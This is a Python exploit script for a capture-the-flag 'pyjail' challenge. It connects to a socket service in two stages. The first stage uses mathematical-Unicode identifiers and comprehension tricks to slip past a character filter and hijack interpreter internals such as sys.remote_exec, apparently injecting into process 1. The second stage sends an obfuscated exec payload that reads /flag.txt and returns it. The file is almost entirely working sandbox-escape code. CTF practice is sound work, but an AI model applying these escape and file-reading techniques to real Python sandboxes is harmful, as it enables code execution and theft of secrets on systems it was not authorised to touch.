#!/usr/bin/env python3
import socket
import time
import sys
import argparse

def to_u(s):
    return "".join(chr(0x1D41A + ord(c) - ord("a")) if "a" <= c <= "z" else c for c in s)

u_exec = to_u("exec")
u_chr = to_u("chr")

def make_str(s):
    return "+".join(f"{u_chr}({ord(c)})" for c in s)

cond = "[[sys.argv[sys.f][sys.f]]in[[sys.executable[sys.f]]]][sys.f]"
targets_51 = ",".join(["x"] * 19 + ["sys.m"] + ["x"] * 31)

line1 = "[[sys]for[sys.t]in[[[sys]in[[sys]]]]]," \
        "[[sys]for[sys.f]in[[[sys]in[]]]]," \
        "[[sys]for[sys.c]in[[sys.__spec__._uninitialized_submodules.__new__.__self__]]]," \
        f"[[sys]for[{targets_51}]in[[],[[sys.modules]][sys.f]][{cond}]]," \
        f"[[sys]for[sys.u]in[[sys.modules[sys.m].f.name]if{cond}else[sys.argv[sys.f]]]]," \
        f"[[sys]for[idk.__defaults__]in[[sys.c[sys.u,sys.remote_exec].__args__]if{cond}else[sys.c[sys.t,sys.u,sys.remote_exec].__args__]]]," \
        "[[sys]for[sys.stdout.flush]in[[idk]]]," \
        f"[[sys]for[x]in[[idk]]if{cond}for[sys.modules[sys.m].time.sleep]in[[x]]]"

allowed = "abcdefghijklmnopqrstuvwxyz:_.[],"
filtered1 = "".join(c for c in line1 if c in allowed)
for b in ["ass", "typ", "als"]:
    assert b not in filtered1, f"Banned substring found: {b}"

raw_python = """
import sys
m = sys.modules["__main__"]
flag = open("/flag.txt", "rb").read()
m.client_socket.sendall(b"FLAG_RECV:" + flag + b":FLAG_END\\n")
""".strip()

payload2 = f"{u_exec}({make_str(raw_python)})"

def run_exploit(host="127.0.0.1", port=1337):
    print(f"[*] Stage 1 payload size: {len(line1)} bytes")
    print(f"[*] Connecting Stage 1 to {host}:{port}...")
    s1 = socket.socket()
    s1.settimeout(10)
    s1.connect((host, port))
    s1.recv(1024)
    s1.sendall(line1.encode() + b"\n")
    time.sleep(0.3)
    s1.sendall(b"END\n")
    s1.recv(1024)
    s1.close()
    print("[+] S1 completed! Waiting 1.5s for PID 1 injection...")
    time.sleep(1.5)

    print(f"[*] Connecting Stage 2 to {host}:{port}...")
    s2 = socket.socket()
    s2.settimeout(10)
    s2.connect((host, port))
    s2.recv(1024)
    s2.sendall(payload2.encode() + b"\n")
    time.sleep(0.3)
    s2.sendall(b"END\n")
    s2.recv(1024)

    print("[*] Waiting for flag...")
    data = b""
    while True:
        try:
            chunk = s2.recv(1024)
            if not chunk: break
            data += chunk
            if b":FLAG_END" in data: break
        except Exception:
            break
    s2.close()

    print("\n" + "="*50)
    print(f"[!] RECEIVED: {data}")
    print("="*50 + "\n")

    if b"FLAG_RECV:" in data:
        flag = data.split(b"FLAG_RECV:", 1)[1].split(b":FLAG_END", 1)[0].decode("utf-8", "ignore").strip()
        print(f"[🎉] FLAG FOUND: {flag}")
        with open("/home/light/Workspace/CTF/TFC_CTF_2026/Misc/The_pyjail/challenge/flag.txt", "w") as f:
            f.write(flag + "\n")
        return flag
    return None

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="The pyjail Exploit")
    parser.add_argument("--host", default="127.0.0.1", help="Target host")
    parser.add_argument("-p", "--port", type=int, default=1337, help="Target port")
    args = parser.parse_args()
    run_exploit(args.host, args.port)
